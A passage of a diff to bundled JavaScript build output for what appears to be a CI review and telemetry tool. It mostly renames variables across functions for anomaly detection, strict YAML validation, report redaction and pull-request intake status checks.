+    hash4 ^= text4.charCodeAt(index);
+    hash4 = Math.imul(hash4, 16777619) >>> 0;
   }
-  return hash3;
+  return hash4;
 }
 function rolloutOrder(id, repositories, canaries = []) {
   const unique = [...new Set(repositories)];
@@ -24533,8 +27161,8 @@ function detectRegression(series, settings) {
 }
 function detectAnomalies(series, settings) {
   const alerts = [];
-  for (const entry of series) {
-    const alert = detectRegression(entry, settings) ?? detectSpike(entry, settings);
+  for (const entry2 of series) {
+    const alert = detectRegression(entry2, settings) ?? detectSpike(entry2, settings);
     if (alert) alerts.push(alert);
   }
   return alerts.sort((a, b) => b.increasePercent - a.increasePercent);
@@ -24550,11 +27178,11 @@ function formatDuration(ms) {
   const totalSeconds = Math.round(Math.abs(ms) / 1e3);
   const hours = Math.floor(totalSeconds / 3600);
   const minutes = Math.floor(totalSeconds % 3600 / 60);
-  const seconds2 = totalSeconds % 60;
+  const seconds3 = totalSeconds % 60;
   const sign = ms < 0 ? "-" : "";
   if (hours > 0) return `${sign}${hours}h ${minutes}m`;
-  if (minutes > 0) return `${sign}${minutes}m ${seconds2}s`;
-  return `${sign}${seconds2}s`;
+  if (minutes > 0) return `${sign}${minutes}m ${seconds3}s`;
+  return `${sign}${seconds3}s`;
 }
 function seriesKey(alert) {
   return alert.jobKey ?? "*";
@@ -24663,7 +27291,7 @@ function readBaselines(issue) {
   try {
     const parsed = JSON.parse(issue.attributes.baselines);
     if (typeof parsed !== "object" || parsed === null) return {};
-    return Object.fromEntries(Object.entries(parsed).filter((entry) => typeof entry[1] === "number"));
+    return Object.fromEntries(Object.entries(parsed).filter((entry2) => typeof entry2[1] === "number"));
   } catch {
     return {};
   }
@@ -24985,9 +27613,9 @@ function percentage(part2, whole) {
   return whole > 0 ? `${(part2 / whole * 100).toFixed(0)}%` : "0%";
 }
 function formatDuration2(milliseconds) {
-  const seconds2 = Math.round(milliseconds / 1e3);
-  const minutes = Math.floor(seconds2 / 60);
-  const remainder = seconds2 % 60;
+  const seconds3 = Math.round(milliseconds / 1e3);
+  const minutes = Math.floor(seconds3 / 60);
+  const remainder = seconds3 % 60;
   return minutes > 0 ? `${minutes}m ${remainder}s` : `${remainder}s`;
 }
 function withoutMillis(value2) {
@@ -25001,7 +27629,7 @@ function escapeCell(value2) {
 }
 
 // src/telemetry/snapshot.ts
-var import_yaml24 = __toESM(require_dist(), 1);
+var import_yaml39 = __toESM(require_dist(), 1);
 init_history();
 function workflowPath(path) {
   return path.replace(/@.*$/, "");
@@ -25009,7 +27637,7 @@ function workflowPath(path) {
 function parseJobDefinitions(text4) {
   let document;
   try {
-    document = (0, import_yaml24.parse)(text4);
+    document = (0, import_yaml39.parse)(text4);
   } catch {
     return /* @__PURE__ */ new Map();
   }
@@ -26264,7 +28892,7 @@ function capComment(body, max2 = MAX_COMMENT_LENGTH) {
 }
 
 // src/review/project.ts
-var import_yaml25 = __toESM(require_dist(), 1);
+var import_yaml40 = __toESM(require_dist(), 1);
 var PROJECT_FILE = "project.yaml";
 var PROJECT_MAX_BYTES = 8 * 1024;
 var NAME_PATTERN = /^[a-z0-9][a-z0-9-]{0,62}$/;
@@ -26280,7 +28908,7 @@ function parseStrictYaml(text4, maxBytes, label) {
   if (/^%/m.test(text4)) return { problems: [`${label} must not contain YAML directives (lines starting with %).`] };
   let documents;
   try {
-    documents = (0, import_yaml25.parseAllDocuments)(text4, { uniqueKeys: true, merge: false, version: "1.2", prettyErrors: true });
+    documents = (0, import_yaml40.parseAllDocuments)(text4, { uniqueKeys: true, merge: false, version: "1.2", prettyErrors: true });
   } catch (error2) {
     return { problems: [`${label} is not valid YAML (${describeValue(error2 instanceof Error ? error2.message : String(error2))}).`] };
   }
@@ -26293,20 +28921,20 @@ function parseStrictYaml(text4, maxBytes, label) {
   for (const issue of [...document.errors, ...document.warnings]) {
     problems.push(`${label} is not valid YAML: ${issue.code} at line ${issue.linePos?.[0]?.line ?? "?"}.`);
   }
-  if (!(0, import_yaml25.isMap)(document.contents)) problems.push(`${label} must be a YAML mapping at the top level.`);
-  (0, import_yaml25.visit)(document, {
+  if (!(0, import_yaml40.isMap)(document.contents)) problems.push(`${label} must be a YAML mapping at the top level.`);
+  (0, import_yaml40.visit)(document, {
     Alias() {
       problems.push(`${label} must not use YAML aliases (*name).`);
-      return import_yaml25.visit.BREAK;
+      return import_yaml40.visit.BREAK;
     },
     Node(_key, node) {
       if (node.anchor) problems.push(`${label} must not use YAML anchors (&name).`);
       if (node.tag) problems.push(`${label} must not use YAML tags (${describeValue(node.tag)}).`);
     },
     Pair(_key, pair) {
-      if (!(0, import_yaml25.isScalar)(pair.key) || typeof pair.key.value !== "string") {
+      if (!(0, import_yaml40.isScalar)(pair.key) || typeof pair.key.value !== "string") {
         problems.push(`${label} keys must be plain strings.`);
-        return import_yaml25.visit.SKIP;
+        return import_yaml40.visit.SKIP;
       }
       if (pair.key.value === "<<") problems.push(`${label} must not use YAML merge keys (<<).`);
       return void 0;
@@ -26515,7 +29143,7 @@ function isSensitive(diagnostic) {
   return SENSITIVE_RULES.has(diagnostic.ruleId) || SENSITIVE_TEXT.test(diagnostic.message) || SENSITIVE_TEXT.test(diagnostic.suggestion ?? "");
 }
 var SEVERITY_ORDER = { error: 0, warn: 1, info: 2 };
-function finding(diagnostic) {
+function finding2(diagnostic) {
   return {
     ruleId: diagnostic.ruleId,
     severity: diagnostic.severity,
@@ -26542,7 +29170,7 @@ function buildReport(outcome2, options) {
     status: outcome2.status,
     problems: [...outcome2.problems],
     notes: [...outcome2.notes],
-    findings: shown.slice(0, MAX_REPORT_FINDINGS).map(finding),
+    findings: shown.slice(0, MAX_REPORT_FINDINGS).map(finding2),
     redacted: { count: hidden.length, rules: [...new Set(hidden.map((diagnostic) => diagnostic.ruleId))].sort() },
     summary: { filesAnalyzed: outcome2.status === "ok" ? outcome2.filesAnalyzed : 0, error: count("error"), warn: count("warn"), info: count("info"), inventoryComplete: outcome2.inventoryComplete }
   };
@@ -26947,11 +29575,11 @@ function failureReason(result) {
 function intakeCommitStatus(entries2) {
   const status = (state, description) => ({ state, description: description.slice(0, STATUS_DESCRIPTION_MAX) });
   if (entries2.length === 0) return status("failure", "No open pull request points at this commit.");
-  const failed = entries2.filter((entry) => entry.result.exitCode !== 0);
+  const failed = entries2.filter((entry2) => entry2.result.exitCode !== 0);
   const [first] = failed;
   if (failed.length > 1) return status("failure", `${failed.length} pull requests at this commit failed intake.`);
   if (first) return status("failure", `#${first.pr}: ${failureReason(first.result)}`);
-  if (entries2.every((entry) => entry.result.kind === "none")) return status("success", "No project changes to review.");
+  if (entries2.every((entry2) => entry2.result.kind === "none")) return status("success", "No project changes to review.");
   return status("success", "Intake checks passed.");
 }
 
@@ -26981,7 +29609,7 @@ scheduled --json-dir also writes one public JSON report per project (<dir>/<proj
 scheduled workflow signs with a build provenance attestation.
 The registry defaults to $GITHUB_REPOSITORY, then ${DEFAULT_REGISTRY}.
 `;
-var SHA = /^[0-9a-f]{40}$/;
+var SHA2 = /^[0-9a-f]{40}$/;
 var SCHEDULED_MAX_BYTES = 900 * 1024;
 var SCHEDULED_PROJECT_MAX_BYTES = 30 * 1024;
 function registryFrom(value2, io) {
@@ -27085,7 +29713,7 @@ async function intakeCommand(args, io) {
   const pr = Number(values2.pr);
   if (!values2.pr || !/^[1-9][0-9]{0,9}$/.test(values2.pr) || !Number.isSafeInteger(pr)) throw new UsageError("review intake needs --pr <number>.");
   const headSha = values2["head-sha"];
-  if (headSha !== void 0 && !SHA.test(headSha)) throw new UsageError("--head-sha must be a full 40-character lowercase commit SHA.");
+  if (headSha !== void 0 && !SHA2.test(headSha)) throw new UsageError("--head-sha must be a full 40-character lowercase commit SHA.");
   const repo = repoFrom(values2.repo, io);
   const registry = registryFrom(values2.registry ?? `${repo.owner}/${repo.repo}`, io);
   const client = githubClient(io);
@@ -27162,7 +29790,7 @@ async function intakeStatusCommand(args, io) {
     return 0;
   }
   const headSha = values2["head-sha"];
-  if (!headSha || !SHA.test(headSha)) throw new UsageError("review intake-status needs --head-sha with a full 40-character lowercase commit SHA.");
+  if (!headSha || !SHA2.test(headSha)) throw new UsageError("review intake-status needs --head-sha with a full 40-character lowercase commit SHA.");
   let pr;
   if (values2.pr !== void 0) {
     pr = Number(values2.pr);
@@ -27232,7 +29860,7 @@ async function scheduledCommand(args, io) {
   } catch (error2) {
     throw new UsageError(`Cannot read ${values2.dir}: ${error2.message}`);
   }
-  const names = entries2.filter((entry) => entry.isDirectory()).map((entry) => entry.name).sort();
+  const names = entries2.filter((entry2) => entry2.isDirectory()).map((entry2) => entry2.name).sort();
   const client = githubClient(io);
   const rows = [];
   const details = [];
